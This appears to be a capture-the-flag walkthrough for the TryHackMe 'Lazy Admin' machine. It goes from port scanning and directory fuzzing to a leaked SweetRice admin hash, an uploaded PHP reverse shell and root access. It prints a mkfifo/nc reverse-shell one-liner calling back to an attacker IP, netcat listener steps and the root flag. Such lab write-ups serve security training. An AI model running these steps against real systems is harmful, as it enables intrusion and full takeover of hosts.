@@ -1,0 +1,136 @@
+So today we are going to solve another Linux machine from THM - Lazy Admin
+Easy Machine.
+
+Main IP :: 10.49.170.82
+
+So we got the Main IP we will start with full port scan with nmap.
+
+Only 2 ports are open -> 22,80.
+
+Nmap scan report for ip-10-49-170-82.ap-south-1.compute.internal (10.49.170.82)
+Host is up, received reset ttl 64 (0.00058s latency).
+Scanned at 2026-05-17 03:05:51 UTC for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
+|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+So we start out with this in burp suite and look for what is into the webpage
+
+So we see default Apache2 page 
+
+we start with fuzzing and looking at source code if there is something hidden.
+
+So we right here start to fuzz with ffuf and we will find the directory which is /content/
+
+when we visit that directory we see a sweetrice based web page.
+
+so we did more fuzzing from /content parameter and we found out that there are more parameter like /inc, /js, /images and things like it.
+
+So after finding this all we move to /inc and we start to see alot of listing and by with 
+
+Index of /content/inc
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[   ]	404.php	2016-09-19 17:55	1.9K	 
+[   ]	alert.php	2016-09-19 17:55	2.1K	 
+[DIR]	cache/	2019-11-29 12:30	-	 
+[   ]	close_tip.php	2016-09-19 17:55	2.4K	 
+[   ]	db.php	2019-11-29 12:30	165	 
+[   ]	do_ads.php	2016-09-19 17:55	782	 
+[   ]	do_attachment.php	2016-09-19 17:55	640	 
+[   ]	do_category.php	2016-09-19 17:55	2.8K	 
+[   ]	do_comment.php	2016-09-19 17:55	3.0K	 
+[   ]	do_entry.php	2016-09-19 17:55	2.6K	 
+[   ]	do_home.php	2016-09-19 17:55	1.8K	 
+[   ]	do_lang.php	2016-09-19 17:55	387	 
+[   ]	do_rssfeed.php	2016-09-19 17:55	1.5K	 
+[   ]	do_sitemap.php	2016-09-19 17:55	4.5K	 
+[   ]	do_tags.php	2016-09-19 17:55	2.7K	 
+[   ]	do_theme.php	2016-09-19 17:55	452	 
+[   ]	error_report.php	2016-09-19 17:55	2.5K	 
+[DIR]	font/	2016-09-19 17:57	-	 
+[   ]	function.php	2016-09-19 17:55	89K	 
+[TXT]	htaccess.txt	2016-09-19 17:55	137	 
+[   ]	init.php	2016-09-19 17:55	3.9K	 
+[   ]	install.lock.php	2019-11-29 12:30	45	 
+[DIR]	lang/	2016-09-19 17:57	-	 
+[TXT]	lastest.txt	2016-09-19 17:55	5	 
+[DIR]	mysql_backup/	2019-11-29 12:30	-	 
+[   ]	rssfeed.php	2016-09-19 17:55	1.6K	 
+[   ]	rssfeed_category.php	2016-09-19 17:55	1.7K	 
+[   ]	rssfeed_entry.php	2016-09-19 17:55	2.1K	 
+[   ]	sitemap_xml.php	2016-09-19 17:55	2.1K	 
+Apache/2.4.18 (Ubuntu) Server at 10.49.170.82 Port 80
+
+and moving with this we have MySQL backup also which is good when we look into it we downloaded the MySQL backup and will look for it within it.
+
+1.5.1 - > can be considered as sweetrice version but here nothing just version written
+
+Password123 -> 42f749ade7f9e195bf475f37a44cafcb
+
+When we look deep into the MySQL.backup we see manager admin password 4 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - 
+
+
+so we can now login to the dashboard panel from http://ip/content/as
+with creds manager:Password123
+
+moving on now we know the exact version which we can use basically for finding exact vulnerable exploits
+
+
+So from exploit-db we found out that this version is vulnerable to Arbitary File Upload vulnerability.
+
+So we look and found out that http://10.49.170.82/content/as/?type=media_center this is the parameter where the vulnerability stays so we will upload a shell from pentest monkey directly.
+
+10.49.104.149
+
+We will edit this our ip into the shell and will upload and capture it on port 4444 via nc
+
+4444
+Listening on 0.0.0.0 4444
+Connection received on 10.49.170.82 57548
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 06:33:59 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+so we have the shell let's stabilize it.
+
+PRIVILEDGE ESCALATION:
+
+
+www-data@THM-Chal:/home/itguy$ cat backup.pl 
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+www-data@THM-Chal:/home/itguy$ ls -lah backup.pl 
+-rw-r--r-x 1 root root 47 Nov 29  2019 backup.pl
+so i came to know that we can run this without being root and also edit too it also has root user access to.
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.49.104.149 5554 > /tmp/f" > /etc/copy.sh
+
+so we wrote the file so we can trigger the root shell.
+
+49:~/Downloads/SweetRice-CMS-1.5.1-RCE-Exploit# nc -lvnp 5554
+Listening on 0.0.0.0 5554
+Connection received on 10.49.170.82 40246
+# whoami
+root
+# cat /root/root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+
+And thus we are now root and read the contents of root.txt
